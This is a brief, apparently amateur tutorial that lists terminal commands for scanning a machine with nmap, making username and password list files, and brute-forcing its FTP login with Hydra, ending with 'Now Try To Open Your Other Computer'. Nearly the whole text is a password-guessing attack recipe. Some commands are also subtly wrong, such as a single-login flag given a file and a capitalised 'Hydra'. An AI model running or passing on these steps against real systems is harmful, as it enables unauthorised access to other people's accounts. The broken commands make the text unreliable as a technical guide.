nmap -Pn (your ip addreas)
clear
sudo nano username.txt (Create Your Username)
to save (LCONTROL+O) and press enter. Exit (LCONTROL+X)
sudo nano password.txt (Create Your Password)
to save (LCONTROL+O) and press enter. Exit (LCONTROL+X)
clear
hydra -h
This is for change password user type
Hydra -l username.txt -P password.txt ftp://(Your Ip Addreas) -V
Now Try To Open Your Other Computer
